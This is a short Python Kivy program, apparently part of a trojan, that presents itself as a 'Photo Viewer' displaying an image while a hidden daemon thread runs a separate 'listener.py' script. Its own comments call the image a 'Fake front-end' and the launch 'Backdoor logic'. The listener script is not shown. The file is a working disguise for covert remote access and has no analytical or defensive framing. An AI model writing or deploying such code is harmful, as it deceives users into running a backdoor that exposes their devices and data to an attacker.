from kivy.app import App
from kivy.uix.image import Image
from kivy.uix.boxlayout import BoxLayout
from kivy.core.window import Window
from threading import Thread
import os

class SabsoubUI(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.add_widget(Image(source='final_image.jpg'))  # Fake front-end

class SabsoubApp(App):
    def build(self):
        Window.clearcolor = (0, 0, 0, 1)
        self.title = "Photo Viewer"
        Thread(target=self.start_listener, daemon=True).start()
        return SabsoubUI()

    def start_listener(self):
        try:
            os.system("python3 listener.py")  # Backdoor logic
        except Exception as e:
            print(f"[ERROR] {e}")

if __name__ == '__main__':
    SabsoubApp().run()
